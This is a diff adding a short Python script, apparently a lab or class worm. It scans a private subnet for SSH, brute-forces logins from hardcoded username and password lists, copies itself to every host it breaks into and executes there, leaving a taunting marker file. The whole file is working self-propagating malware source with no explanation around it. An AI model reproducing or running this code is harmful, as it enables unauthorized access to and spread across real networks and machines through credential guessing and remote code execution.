@@ -1,0 +1,42 @@
+#! /usr/bin/env python3
+
+import nmap
+import paramiko
+import sys
+from scp import SCPClient
+
+
+
+nmScan = nmap.PortScanner()
+
+nmScan.scan('10.0.0.0/24', '22')
+nmScan.command_line()
+
+networkhosts = []
+
+
+for host in nmScan.all_hosts():
+    networkhosts.append(host)
+print(networkhosts)
+
+
+for element in networkhosts:
+    host = element
+    port = 22
+    usernames = ['sam','gavin','stephen','devin','kali']
+    passwords = ['admin','stephen','penelope','password','kali'] 
+    for user in usernames:
+        for pword in passwords:
+            username = user
+            password = pword
+            command = "./WormyTheWorm && touch WormyWuzHere && echo 'Haha no code for you :)' > WormyWuzHere && rm WormyTheWorm"
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            try:
+                ssh.connect(host, port, username, password, timeout=5)
+                scp = SCPClient(ssh.get_transport()) 
+                scp.put(sys.argv[0])
+                stdin, stdout, stderr = ssh.exec_command(command)
+                print(host + ' Success :)')
+            except:
+                print(host + ' Timeout :(')
